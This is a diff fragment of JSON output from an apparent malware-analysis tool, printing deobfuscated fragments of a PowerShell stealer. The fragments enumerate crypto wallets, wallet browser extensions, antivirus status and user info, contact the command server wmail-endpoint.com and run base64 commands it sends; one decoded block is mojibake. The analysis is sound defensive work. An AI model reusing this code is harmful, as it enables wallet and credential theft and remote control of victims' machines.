+        "dekodiert": "get /v2/0f3a54ec-4191-4feb-9791-82f91277498e?v=ver%5f2 http/1.1\r\nhost: wmail-endpoint.com\r\nconnection: keep-alive\r\npragma: no-cache\r\ncache-control: no-cache\r\nupgrade-insecure-requests: 1\r\nuser-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.71 safari/537.36\r\naccept-language: en-us,en;q=0.9\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\naccept-encoding: gzip, deflate"
+      },
+      {
+        "laenge": 16960,
+        "dekodiert": "卛獹整⹭湅楶潲浮湥嵴㨺畃牲湥䑴物捥潴祲㴠␠坐⹄慐桴഻䄊摤吭灹⁥倭瑡⁨␢湥㩶楷摮物䵜捩潲潳瑦丮呅䙜慲敭潷歲㐶癜⸴⸰〳ㄳ尹祓瑳浥刮湵楴敭搮汬㬢਍摁ⵤ祔数ⴠ慐桴∠攤癮眺湩楤屲楍牣獯景⹴䕎屔牆浡睥牯㙫尴㑶〮㌮㌰㤱卜獹整⹭畒瑮浩⹥湉整潲印牥楶散⹳汤≬഻ഊ␊牣慥整乤睥㴠␠牴敵഻␊畭整乸浡⁥‽䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧卛獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹䡓㉁㘵㩝䌺敲瑡⡥⸩潃灭瑵䡥獡⡨呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㔴㔹␱␨湥㩶佃偍呕剅䅎䕍ㄩ㠲㔸⠤攤癮唺䕓乒䵁⥅㌲㤴⤢⤩഻␊畭整⁸‽卛獹整⹭桔敲摡湩⹧畍整嵸㨺敮⡷琤畲ⱥ␠畭整乸浡ⱥ嬠敲嵦挤敲瑡摥敎⥷഻椊⁦␨牣慥整乤睥ⴠ煥␠慦獬⥥笠਍††敲畴湲഻紊਍਍愤獳浥汢敩⁳‽敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭潃汬捥楴湯⹳敇敮楲⹣楄瑣潩慮祲嬧瑳楲杮‬祓瑳浥刮晥敬瑣潩⹮獁敳扭祬❝ⴠ牁畧敭瑮楌瑳⠠卛牴湩䍧浯慰敲嵲㨺牏楤慮䥬湧牯䍥獡⥥਍潦敲捡⁨␨獡敳扭祬椠⁮嬨灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敇䅴獳浥汢敩⡳⤩ ൻ †␠獡敳扭楬獥孛祓瑳浥䤮⹏慐桴㩝䜺瑥楆敬慎敭␨獡敳扭祬䰮捯瑡潩⥮⁝‽愤獳浥汢㭹਍ൽഊ昊湵瑣潩⁮敇⵴湕慳敦畆据楴湯笠਍††慰慲⁭ന †††嬠瑳楲杮൝ †††␠潭畤敬ബ †††嬠瑳楲杮൝ †††␠慮敭ബ †††嬠祴数嵛൝ †††␠慰慲獭ബ †††嬠祴数൝ †††␠敲瑴灹൥ †⤠਍††渤⁡‽愤獳浥汢敩孳匧獹整⹭汤❬⹝敇呴灹⡥✨楍牣獯景❴⬠✠圮湩㈳✮⬠✠湕慳敦❎⬠✠瑡癩䵥瑥潨獤⤧㬩਍††朤⁰‽渤⹡敇䵴瑥潨⡤䜧瑥牐捯摁牤獥❳‬呛灹孥嵝䀠✨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥Ⱗ✠瑳楲杮⤧㬩਍††洤⁤‽渤⹡敇䵴瑥潨⡤䜧瑥潍畤敬慈摮敬⤧䤮癮歯⡥渤汵ⱬ䀠␨潭畤敬⤩഻ †␠瑰⁲‽朤⹰湉潶敫␨畮汬‬⡀嬨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥㩝渺睥嬨扯敪瑣㩝渺睥⤨‬洤⥤Ⱙ␠慮敭⤩഻ †␠畢㴠嬠灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敄楦敮祄慮業䅣獳浥汢⡹卛獹整⹭敒汦捥楴湯䄮獳浥汢乹浡嵥㨺敮⡷✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩Ⱙ嬠祓瑳浥刮晥敬瑣潩⹮浅瑩䄮獳浥汢䉹極摬牥捁散獳㩝刺湵⸩敄楦敮祄慮業䵣摯汵⡥✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩‬昤污敳⸩敄楦敮祔数⠨弧‧‫杛極嵤㨺敎䝷極⡤⸩潔瑓楲杮⤨Ⱙ✠汃獡ⱳ倠扵楬Ᵽ匠慥敬Ɽ䄠獮䍩慬獳‬畁潴汃獡❳‬卛獹整⹭畍瑬捩獡䑴汥来瑡嵥㬩਍††戤⹵敄楦敮潃獮牴捵潴⡲刧協数楣污慎敭‬楈敤祂楓Ⱨ倠扵楬❣‬卛獹整⹭敒汦捥楴湯䌮污楬杮潃癮湥楴湯嵳㨺瑓湡慤摲‬瀤牡浡⥳匮瑥浉汰浥湥慴楴湯汆条⡳刧湵楴敭‬慍慮敧❤㬩਍††戤⹵敄楦敮敍桴摯✨湉潶敫Ⱗ✠畐汢捩‬楈敤祂楓Ⱨ丠睥汓瑯‬楖瑲慵❬‬爤瑥祴数‬瀤牡浡⥳匮瑥浉汰浥湥慴楴湯汆条⡳刧湵楴敭‬慍慮敧❤㬩਍††搤汥㴠␠畢䌮敲瑡呥灹⡥㬩਍††敲畴湲嬠祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䴮牡桳污㩝䜺瑥敄敬慧整潆䙲湵瑣潩偮楯瑮牥␨瑰Ⱳ␠敤⥬഻紊਍਍਍判来獩整䍲慬獳硅㴠䜠瑥唭獮晡䙥湵瑣潩⁮甧敳㍲⸲汤❬✠敒楧瑳牥汃獡䕳坸‧⡀䥛瑮瑐嵲 嬨䥕瑮㘱⥝഻␊牃慥整楗摮睯硅㴠䜠瑥唭獮晡䙥湵瑣潩⁮甧敳㍲⸲汤❬✠牃慥整楗摮睯硅❗䀠嬨䥕瑮㈳ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠䥕瑮㈳ⱝ嬠湉㍴崲‬䥛瑮㈳ⱝ嬠湉㍴崲‬䥛瑮㈳ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠湉側牴⥝⠠䥛瑮瑐嵲㬩਍䜤瑥敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䜧瑥敍獳条坥‧⡀䥛瑮瑐嵲‬䥛瑮瑐嵲‬啛湉㍴崲‬啛湉㍴崲 嬨湉㍴崲㬩਍吤慲獮慬整敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧吧慲獮慬整敍獳条❥䀠嬨湉側牴⥝⠠䉛潯敬湡⥝഻␊楄灳瑡档敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䐧獩慰捴䵨獥慳敧❗䀠嬨湉側牴⥝⠠䥛瑮瑐嵲㬩਍䄤摤汃灩潢牡䙤牯慭䱴獩整敮⁲‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䄧摤汃灩潢牡䙤牯慭䱴獩整敮❲䀠嬨"
+      }
+    ],
+    "base64_bloecke_gesamt": 2,
+    "beobachtete_cmdlets": [
+      "Brave-Browser",
+      "Build-Request",
+      "Get-Apps",
+      "Get-AvStatus",
+      "Get-ChildItem",
+      "Get-InstallStatus",
+      "Get-Random",
+      "Get-UserID",
+      "Get-UserId",
+      "Get-UserInfo",
+      "Get-WmiObject",
+      "Join-Path",
+      "New-Object",
+      "Resolve-Path",
+      "Run-Command",
+      "Select-String",
+      "Start-Job",
+      "Start-Sleep",
+      "Test-Path",
+      "Wait-Job"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 3
+    },
+    "iocs": {
+      "urls": [
+        "http://wmail-endpoint.com"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:ALLUSERSPROFILE\\Microsoft\\Windows\\Start",
+        "$env:APPDATA\\Microsoft\\Internet",
+        "$env:APPDATA\\Microsoft\\Windows\\Start",
+        "$env:PUBLIC\\Desktop",
+        "$env:USERDOMAIN",
+        "$env:USERNAME",
+        "$env:USERPROFILE\\Desktop",
+        "$env:USERPROFILE\\OneDrive\\Desktop",
+        "%appdata%",
+        "%localappdata%",
+        "%localappdata%\\BraveSoftware\\Brave-Browser\\User",
+        "%localappdata%\\Google\\Chrome\\User",
+        "%localappdata%\\Microsoft\\Edge\\User"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Z2V0IC92Mi8wZjNhNTRlYy00MTkxLTRmZWItOTc5MS04MmY5MTI3NzQ5OGU/dj12ZXIlNWYyIGh0dHAvMS4xDQpob3N0OiB3bWFpbC1lbmRwb2ludC5jb20NCmNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCnByYWdtYTogbm8tY2FjaGUNCmNhY2hlLWNvbnRyb2w6IG5vLWNhY2hlDQp1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOiAxDQp1c2VyLWFnZW50OiBtb3ppbGxhLzUuMCAod2luZG93cyBudCAxMC4wOyB3aW42NDsgeDY0KSBhcHBsZXdlYmtpdC81MzcuMzYgKGtodG1sLCBsaWtlIGdlY2tvKSBjaHJvbWUvNzYuMC4zODA5LjcxIHNhZmFyaS81MzcuMzYNCmFjY2VwdC1sYW5ndWFnZTogZW4tdXMsZW47cT0wLjkNCmFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMw0KYWNjZXB0LWVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQoNCg==",
+      "6626b3d5-9306-45cb-91ca-3e86a88840e2",
+      "`r`n",
+      ";\r\n$http_request.path = $_requestline[1].Replace(",
+      ").Replace(",
+      ");\r\n\r\nfor ($i = 1; $i -lt $_headers.Length; $i++) {\r\n    [string[]]$h = $_headers[$i] -split ",
+      ";\r\n    if ($h.Length -lt 2) {\r\n        break;\r\n    }\r\n    $http_headers[$h[0]] = $h[1];\r\n}\r\n\r\n$user_auth = @{\r\n    id = -1;\r\n};\r\n\r\n$client = New-Object ",
+      "\r\n\r\nfunction WMI {\r\n    param (\r\n        $namespace,\r\n        $class\r\n    )\r\n    try {\r\n        return Get-WmiObject -Namespace $namespace -Class $class;\r\n    }\r\n    catch {\r\n    }\r\n    return $null;\r\n}\r\n\r\nfunction Get-AvStatus {\r\n    param (\r\n        $av\r\n    )\r\n    $status = \"Unknown\";\r\n    try {\r\n        $v = [uint32]::Parse($av.productState) -band 0xF000;\r\n        switch ($v) {\r\n            0x0000 { $status = \"Disabled\" }\r\n            0x1000 { $status = \"Enabled\" }\r\n            0x2000 { $status = \"Snoozed\" }\r\n            0x3000 { $status = \"Expired\" }\r\n        }\r\n    }\r\n    catch {\r\n\r\n    }\r\n    return \"$($av.displayName) ($status)\";\r\n}\r\n\r\nfunction Get-InstallStatus {\r\n    param (\r\n        $appname\r\n    )\r\n    $active = 0;\r\n    $inactive = 0;\r\n    $rgx = New-Object ",
+      "\\s?--load-extension=((\"[^\\r\\n\"]*\")|([^\\r\\n\\s]*))",
+      "*.LNK",
+      "OrdinalIgnoreCase",
+      "');\r\n                        $enabled = ((Test-Path $path) -eq $true);\r\n                    }\r\n                }\r\n                if ($enabled) {\r\n                    $active++;\r\n                }\r\n                else {\r\n                    $inactive++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    if (($active -eq 0) -and ($inactive -eq 0)) {\r\n        return $null;\r\n    }\r\n    elseif ($inactive -gt 0) {\r\n        return 'NOK';\r\n    }\r\n    return 'OK';\r\n}\r\n\r\n$searchPaths = @(\r\n    ",
+      ",\r\n    ",
+      "\r\n);\r\n\r\n$searchEntries = @(\r\n    [pscustomobject]@{\r\n        root    = '%appdata%'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Exodus-A'\r\n            path = 'Exodus'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Atomic-A'\r\n            path = 'Atomic Wallet'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Electrum-A'\r\n            path = 'Electrum'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Ledger-A'\r\n            path = 'Ledger Live'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-A'\r\n            path = 'Jaxx Liberty'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'com.liberty.jaxx-A'\r\n            path = 'com.liberty.jaxx'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Guarda-A'\r\n            path = 'Guarda'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Armory-A'\r\n            path = 'Armory'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'DELTA-A'\r\n            path = 'DELTA'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'TREZOR-A'\r\n            path = 'TREZOR Bridge'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Bitcoin-A'\r\n            path = 'Bitcoin'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'binance-A'\r\n            path = 'binance'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Blockstream-A'\r\n            path = 'Blockstream Green'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinomi-A'\r\n            path = 'Coinomi'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\Google\\Chrome\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-C'\r\n            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'MEWcx-C'\r\n            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coin98-C'\r\n            path = 'aeachknmefphepccionboohckonoeemg'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Binance-C'\r\n            path = 'fhbohimaelbohpjbbldcngcnapndodjp'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-C'\r\n            path = 'cjelfplplebdjjenllpjcblmjkfcffne'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinbase-C'\r\n            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-E'\r\n            path = 'ejbalbakoplchlghecdalmeeeajnimhm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinomi-E'\r\n            path = 'gmcoclageakkbkbbflppkbpjcbkcfedg'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-B'\r\n            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'MEWcx-B'\r\n            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coin98-B'\r\n            path = 'aeachknmefphepccionboohckonoeemg'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Binance-B'\r\n            path = 'fhbohimaelbohpjbbldcngcnapndodjp'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-B'\r\n            path = 'cjelfplplebdjjenllpjcblmjkfcffne'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinbase-B'\r\n            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'\r\n        }\r\n    }\r\n);\r\n\r\nfunction Get-Apps {\r\n    $results = New-Object Collections.Generic.List[string];\r\n\r\n    $appEntries = @('chrome.exe', 'brave.exe', 'msedge.exe');\r\n    foreach ($appEntry in $appEntries) {\r\n        $status = Get-InstallStatus $appEntry;\r\n        if ($null -eq $status) {\r\n            continue;\r\n        }\r\n        $results.Add(",
+      ");\r\n    }\r\n\r\n    foreach ($entry in $searchEntries) {\r\n        $rootdir = [System.Environment]::ExpandEnvironmentVariables($entry.root);\r\n        foreach ($target in $entry.targets) {\r\n            if ((Test-Path -Path (Join-Path -Path $rootdir -ChildPath $target.path))) {\r\n                $results.Add($target.name)\r\n            }\r\n        }\r\n    }\r\n    return [string]::Join(', ', $results);\r\n}\r\n\r\nfunction Get-UserInfo {\r\n    $os = WMI ",
+      "Win32_OperatingSystem",
+      "Collections.Generic.List[string]",
+      "root\\SecurityCenter",
+      "AntiVirusProduct",
+      "root\\SecurityCenter2",
+      "$($os.Caption) ($($os.OSArchitecture))",
+      "$($env:USERDOMAIN)\\$($env:USERNAME)",
+      "$([string]::Join(', ', $avs))",
+      "cf-connecting-ip",
+      "cf-ipcountry",
+      "\\?v=(.*)&?",
+      "System.IO.MemoryStream",
+      "Host",
+      "$(-join ((97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 10) | % {[char]$_})).com",
+      "http://wmail-endpoint.com",
+      ";\r\n    }\r\n    return [BitConverter]::ToInt32($res, 0);\r\n}\r\n\r\nfunction Build-Request {\r\n    param (\r\n        [bool]\r\n        $update\r\n    )\r\n\r\n    if ($user_auth.id -eq -1) {\r\n        $user_auth.id = Get-UserId;\r\n    }\r\n\r\n    $ms = New-Object 'System.IO.MemoryStream'\r\n    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);\r\n    $ms.WriteByte(2);\r\n    $ms.Write([BitConverter]::GetBytes([int]$user_auth.id), 0, 4);\r\n    if ($update) {\r\n        $_userinfo = '';\r\n        try {\r\n            $_userinfo = Get-UserInfo;\r\n        }\r\n        catch {\r\n            $_userinfo = ConvertTo-Json @{\r\n                error  = $_.Exception.Message;\r\n                line   = $_.Exception.Line;\r\n                offset = $_.Exception.Offset;\r\n            }\r\n        }\r\n        [byte[]]$userinfo = [Text.Encoding]::UTF8.GetBytes($_userinfo);\r\n        $ms.Write($userinfo, 0, $userinfo.Length);\r\n    }\r\n    $data = $ms.ToArray();\r\n    $ms.Dispose();\r\n    return $data;\r\n}\r\n\r\nfunction Run-Command {\r\n    param (\r\n        [string]\r\n        $command\r\n    )\r\n    $lines = $command -split ",
+      ";\r\n    foreach ($line in $lines) {\r\n        $job = Start-Job -ScriptBlock ([Scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($line))))\r\n        Wait-Job -Job $job -Timeout 10\r\n    }\r\n}\r\n\r\n#$wdg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(",
+      "));\r\n#$wdgjob = Start-Job -ScriptBlock ([Scriptblock]::Create($wdg)); \r\n\r\n\r\n$update = $true;\r\n$retry = 0;\r\n[byte[]]$res = $null;\r\nwhile ($retry -lt 10) {\r\n    try {\r\n        $client.Headers[",
+      "] = ",
+      ";\r\n        $res = $client.UploadData("
+    ],
+    "string_anzahl_gesamt": 40,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 684,
+        "dekodiert": "get /v2/0f3a54ec-4191-4feb-9791-82f91277498e?v=ver%5f2 http/1.1\r\nhost: wmail-endpoint.com\r\nconnection: keep-alive\r\npragma: no-cache\r\ncache-control: no-cache\r\nupgrade-insecure-requests: 1\r\nuser-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.71 safari/537.36\r\naccept-language: en-us,en;q=0.9\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\naccept-encoding: gzip, deflate"
+      },
+      {
+        "laenge": 16960,
+        "dekodiert": "卛獹整⹭湅楶潲浮湥嵴㨺畃牲湥䑴物捥潴祲㴠␠坐⹄慐桴഻䄊摤吭灹⁥倭瑡⁨␢湥㩶楷摮物䵜捩潲潳瑦丮呅䙜慲敭潷歲㐶癜⸴⸰〳ㄳ尹祓瑳浥刮湵楴敭搮汬㬢਍摁ⵤ祔数ⴠ慐桴∠攤癮眺湩楤屲楍牣獯景⹴䕎屔牆浡睥牯㙫尴㑶〮㌮㌰㤱卜獹整⹭畒瑮浩⹥湉整潲印牥楶散⹳汤≬഻ഊ␊牣慥整乤睥㴠␠牴敵഻␊畭整乸浡⁥‽䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧卛獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹䡓㉁㘵㩝䌺敲瑡⡥⸩潃灭瑵䡥獡⡨呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㔴㔹␱␨湥㩶佃偍呕剅䅎䕍ㄩ㠲㔸⠤攤癮唺䕓乒䵁⥅㌲㤴⤢⤩഻␊畭整⁸‽卛獹整⹭桔敲摡湩⹧畍整嵸㨺敮⡷琤畲ⱥ␠畭整乸浡ⱥ嬠敲嵦挤敲瑡摥敎⥷഻椊⁦␨牣慥整乤睥ⴠ煥␠慦獬⥥笠਍††敲畴湲഻紊਍਍愤獳浥汢敩⁳‽敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭潃汬捥楴湯⹳敇敮楲⹣楄瑣潩慮祲嬧瑳楲杮‬祓瑳浥刮晥敬瑣潩⹮獁敳扭祬❝ⴠ牁畧敭瑮楌瑳⠠卛牴湩䍧浯慰敲嵲㨺牏楤慮䥬湧牯䍥獡⥥਍潦敲捡⁨␨獡敳扭祬椠⁮嬨灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敇䅴獳浥汢敩⡳⤩ ൻ †␠獡敳扭楬獥孛祓瑳浥䤮⹏慐桴㩝䜺瑥楆敬慎敭␨獡敳扭祬䰮捯瑡潩⥮⁝‽愤獳浥汢㭹਍ൽഊ昊湵瑣潩⁮敇⵴湕慳敦畆据楴湯笠਍††慰慲⁭ന †††嬠瑳楲杮൝ †††␠潭畤敬ബ †††嬠瑳楲杮൝ †††␠慮敭ബ †††嬠祴数嵛൝ †††␠慰慲獭ബ †††嬠祴数൝ †††␠敲瑴灹൥ †⤠਍††渤⁡‽愤獳浥汢敩孳匧獹整⹭汤❬⹝敇呴灹⡥✨楍牣獯景❴⬠✠圮湩㈳✮⬠✠湕慳敦❎⬠✠瑡癩䵥瑥潨獤⤧㬩਍††朤⁰‽渤⹡敇䵴瑥潨⡤䜧瑥牐捯摁牤獥❳‬呛灹孥嵝䀠✨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥Ⱗ✠瑳楲杮⤧㬩਍††洤⁤‽渤⹡敇䵴瑥潨⡤䜧瑥潍畤敬慈摮敬⤧䤮癮歯⡥渤汵ⱬ䀠␨潭畤敬⤩഻ †␠瑰⁲‽朤⹰湉潶敫␨畮汬‬⡀嬨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥㩝渺睥嬨扯敪瑣㩝渺睥⤨‬洤⥤Ⱙ␠慮敭⤩഻ †␠畢㴠嬠灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敄楦敮祄慮業䅣獳浥汢⡹卛獹整⹭敒汦捥楴湯䄮獳浥汢乹浡嵥㨺敮⡷✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩Ⱙ嬠祓瑳浥刮晥敬瑣潩⹮浅瑩䄮獳浥汢䉹極摬牥捁散獳㩝刺湵⸩敄楦敮祄慮業䵣摯汵⡥✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩‬昤污敳⸩敄楦敮祔数⠨弧‧‫杛極嵤㨺敎䝷極⡤⸩潔瑓楲杮⤨Ⱙ✠汃獡ⱳ倠扵楬Ᵽ匠慥敬Ɽ䄠獮䍩慬獳‬畁潴汃獡❳‬卛獹整⹭畍瑬捩獡䑴汥来瑡嵥㬩਍††戤⹵敄楦敮潃獮牴捵潴⡲刧協数楣污慎敭‬楈敤祂楓Ⱨ倠扵楬❣‬卛獹整⹭敒汦捥楴湯䌮污楬杮潃癮湥楴湯嵳㨺瑓湡慤摲‬瀤牡浡⥳匮瑥浉汰浥湥慴楴湯汆条⡳刧湵楴敭‬慍慮敧❤㬩਍††戤⹵敄楦敮敍桴摯✨湉潶敫Ⱗ✠畐汢捩‬楈敤祂楓Ⱨ丠睥汓瑯‬楖瑲慵❬‬爤瑥祴数‬瀤牡浡⥳匮瑥浉汰浥湥慴楴湯汆条⡳刧湵楴敭‬慍慮敧❤㬩਍††搤汥㴠␠畢䌮敲瑡呥灹⡥㬩਍††敲畴湲嬠祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䴮牡桳污㩝䜺瑥敄敬慧整潆䙲湵瑣潩偮楯瑮牥␨瑰Ⱳ␠敤⥬഻紊਍਍਍判来獩整䍲慬獳硅㴠䜠瑥唭獮晡䙥湵瑣潩⁮甧敳㍲⸲汤❬✠敒楧瑳牥汃獡䕳坸‧⡀䥛瑮瑐嵲 嬨䥕瑮㘱⥝഻␊牃慥整楗摮睯硅㴠䜠瑥唭獮晡䙥湵瑣潩⁮甧敳㍲⸲汤❬✠牃慥整楗摮睯硅❗䀠嬨䥕瑮㈳ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠䥕瑮㈳ⱝ嬠湉㍴崲‬䥛瑮㈳ⱝ嬠湉㍴崲‬䥛瑮㈳ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠湉側牴⥝⠠䥛瑮瑐嵲㬩਍䜤瑥敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䜧瑥敍獳条坥‧⡀䥛瑮瑐嵲‬䥛瑮瑐嵲‬啛湉㍴崲‬啛湉㍴崲 嬨湉㍴崲㬩਍吤慲獮慬整敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧吧慲獮慬整敍獳条❥䀠嬨湉側牴⥝⠠䉛潯敬湡⥝഻␊楄灳瑡档敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䐧獩慰捴䵨獥慳敧❗䀠嬨湉側牴⥝⠠䥛瑮瑐嵲㬩਍䄤摤汃灩潢牡䙤牯慭䱴獩整敮⁲‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䄧摤汃灩潢牡䙤牯慭䱴獩整敮❲䀠嬨"
+      }
+    ],
+    "base64_bloecke_gesamt": 2,
+    "beobachtete_cmdlets": [
+      "Brave-Browser",
+      "Build-Request",
+      "Get-Apps",
+      "Get-AvStatus",
+      "Get-ChildItem",
+      "Get-InstallStatus",
+      "Get-Random",
+      "Get-UserID",
+      "Get-UserId",
+      "Get-UserInfo",
+      "Get-WmiObject",
+      "Join-Path",
+      "New-Object",
+      "Resolve-Path",
+      "Run-Command",
+      "Select-String",
+      "Start-Job",
+      "Start-Sleep",
+      "Test-Path",
+      "Wait-Job"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 3
+    },
+    "iocs": {
+      "urls": [
+        "http://wmail-endpoint.com"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:ALLUSERSPROFILE\\Microsoft\\Windows\\Start",
+        "$env:APPDATA\\Microsoft\\Internet",
+        "$env:APPDATA\\Microsoft\\Windows\\Start",
+        "$env:PUBLIC\\Desktop",
+        "$env:USERDOMAIN",
+        "$env:USERNAME",
+        "$env:USERPROFILE\\Desktop",
+        "$env:USERPROFILE\\OneDrive\\Desktop",
+        "%appdata%",
+        "%localappdata%",
+        "%localappdata%\\BraveSoftware\\Brave-Browser\\User",
+        "%localappdata%\\Google\\Chrome\\User",
+        "%localappdata%\\Microsoft\\Edge\\User"
+      ]
+    },
+    "deobfuskiert_auszug": "$meta_request = 'Z2V0IC92Mi8wZjNhNTRlYy00MTkxLTRmZWItOTc5MS04MmY5MTI3NzQ5OGU/dj12ZXIlNWYyIGh0dHAvMS4xDQpob3N0OiB3bWFpbC1lbmRwb2ludC5jb20NCmNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCnByYWdtYTogbm8tY2FjaGUNCmNhY2hlLWNvbnRyb2w6IG5vLWNhY2hlDQp1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOiAxDQp1c2VyLWFnZW50OiBtb3ppbGxhLzUuMCAod2luZG93cyBudCAxMC4wOyB3aW42NDsgeDY0KSBhcHBsZXdlYmtpdC81MzcuMzYgKGtodG1sLCBsaWtlIGdlY2tvKSBjaHJvbWUvNzYuMC4zODA5LjcxIHNhZmFyaS81MzcuMzYNCmFjY2VwdC1sYW5ndWFnZTogZW4tdXMsZW47cT0wLjkNCmFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMw0KYWNjZXB0LWVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQoNCg==';\r\n$meta_version = 4160822417;\r\n$meta_guid = 19120;\r\n\r\n############################\r\n$createdNew = $false;\r\n$mutex = [System.Threading.Mutex]::new($true, 